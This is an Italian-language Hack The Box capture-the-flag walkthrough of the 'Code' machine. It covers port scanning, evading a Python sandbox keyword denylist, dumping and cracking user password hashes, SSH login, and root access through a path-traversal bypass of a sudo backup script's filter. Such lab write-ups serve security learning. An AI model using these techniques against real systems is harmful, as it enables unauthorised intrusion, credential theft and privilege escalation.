```txt
  /$$$$$$                  /$$          
 /$$__  $$                | $$          
| $$  \__/  /$$$$$$   /$$$$$$$  /$$$$$$ 
| $$       /$$__  $$ /$$__  $$ /$$__  $$
| $$      | $$  \ $$| $$  | $$| $$$$$$$$
| $$    $$| $$  | $$| $$  | $$| $$_____/
|  $$$$$$/|  $$$$$$/|  $$$$$$$|  $$$$$$$
 \______/  \______/  \_______/ \_______/
                                        
                                        
                                        
--------------------------------------------------------------------------------

[ 0x01 ] Abstract
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTB CODE - Walkthrough tecnico by NoFlyFre
Target: 10.10.11.62

--------------------------------------------------------------------------------

[ 0x02 ] Enumeration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cominciamo con la scansione porte:

nmap -sS -p- 10.10.11.62 -T5

PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Porta 5000 con servizio UPnP attivo.

Note su UPnP:
Universal Plug and Play permette ai dispositivi sulla rete di scoprirsi e comunicare, ma può esporre servizi non sicuri su reti pubbliche.

--------------------------------------------------------------------------------

[ 0x03 ] Port 5000 - Service Detection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sV -p 5000 10.10.11.62 -T5

5000/tcp open  http Gunicorn 20.0.4

Si tratta di una webapp Python (Flask/Gunicorn) con sandbox di esecuzione codice Python e area login/registrazione.

--------------------------------------------------------------------------------

[ 0x04 ] Sandbox Testing
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Test di comandi nella sandbox:

print("os.listdir()")
-> Use of restricted keywords is not allowed.

print("o" + "s")
-> 'os' viene stampato. Presente una denylist sui moduli.

--------------------------------------------------------------------------------

[ 0x05 ] Exploring Globals
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Tramite sys.modules si trovano modelli SQLAlchemy, route Flask, riferimenti a User e Code.

--------------------------------------------------------------------------------

[ 0x06 ] Dumping Users from DB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Dump di utenti dal DB:

for user in User.query.all():
    print(user.__dict__)

Risultato:
{username: 'development', password: '759b74ce43947f5f4c91aeddc3e5bad3'}
{username: 'martin', password: '3de6f30c4a09c27fc71932bfc68474be'}

Hash cracking con john:
john --show --format=Raw-MD5 hashes.txt

development:development
martin:nafeelswordsmaster

--------------------------------------------------------------------------------

[ 0x07 ] SSH Access as martin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Accesso SSH con martin. Accesso a /home/app-production limitato.

--------------------------------------------------------------------------------

[ 0x08 ] Discovering backy.sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo -l

(ALL : ALL) NOPASSWD: /usr/bin/backy.sh

backy.sh è un wrapper per il binario backy, che comprime directory in .tar.bz2 secondo task.json.

--------------------------------------------------------------------------------

[ 0x09 ] Reading /home/app-production
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
task.json di esempio:

{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/app-production/app"
  ],
  "exclude": []
}

sudo /usr/bin/backy.sh task.json
tar -xf code_home_app-production_*.tar.bz2
cat home/app-production/user.txt

-> User flag ottenuta

--------------------------------------------------------------------------------

[ 0x0A ] PrivEsc via Path Traversal
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
backy.sh filtra ../ con jq, ma si può bypassare con /var/....//root (diventa /var/../root).

Nuovo task.json:

{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root"
  ],
  "exclude": []
}

sudo /usr/bin/backy.sh task.json
tar -xf code_var_.._root_*.tar.bz2
cat root/root.txt

-> Root flag ottenuta

--------------------------------------------------------------------------------

[ 0x0B ] Summary
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Step      | Descrizione
----------|-------------------------------------------
nmap      | Enumerazione porte
Sandbox   | Esecuzione codice con filtri
DB access | Dump e crack hash utenti
SSH       | Login come martin
PrivEsc   | Abuso backy.sh e bypass path
Root      | Lettura /root/root.txt dall’archivio

Rooted!

--------------------------------------------------------------------------------

[ 0x0C ] Tags / Keywords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
security, htb, walkthrough, pentest, NoFlyFre, hacking, writeup, code

[ 0x0D ] Lingua
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ITA (Italiano)

--------------------------------------------------------------------------------

[ 0x0E ] Credits & Disclaimer
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Autore: NoFlyFre
Tutti i contenuti sono a scopo educativo e di ethical hacking.
Usa queste informazioni in modo responsabile.

--------------------------------------------------------------------------------

        .: Knowledge, Skillz, Root :.
          .: Stay curious! :.
```